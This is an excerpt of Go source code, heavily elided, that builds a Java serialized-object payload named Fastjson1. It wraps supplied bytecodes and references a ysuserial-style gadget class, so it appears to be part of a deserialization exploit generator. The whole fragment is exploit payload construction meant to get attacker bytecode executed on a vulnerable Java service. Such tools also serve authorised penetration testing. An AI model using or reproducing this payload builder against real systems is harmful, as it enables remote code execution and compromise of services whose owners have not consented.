...
func Fastjson1(bytecodes []byte) []byte {
	return ClassObject{
		...
		fields: []Field{
			{"Ljava/lang/Object;", "val", ClassObject{
				...
				serialVersionUID: 0x00,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{Object, "list", ArrayObject{
						name:             "java.util.ArrayList",
						serialVersionUID: 0x00,
						classDescFlags:   0,
						values: interfaces(
							blockData{0x00, 0x00, 0x00, 0x01},
							ClassObject{
					...
					{"[Ljava/lang/StackTraceElement;", "stackTrace", ArrayObject{
						...
						values: interfaces(
							ClassObject{
								...
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "lineNumber", 33},
									{Object, "declaringClass", "org.Nu1r.ysuserial.payloads.gadgets.Fastjson1"},
									{Object, "fileName", "Fastjson1.java"},
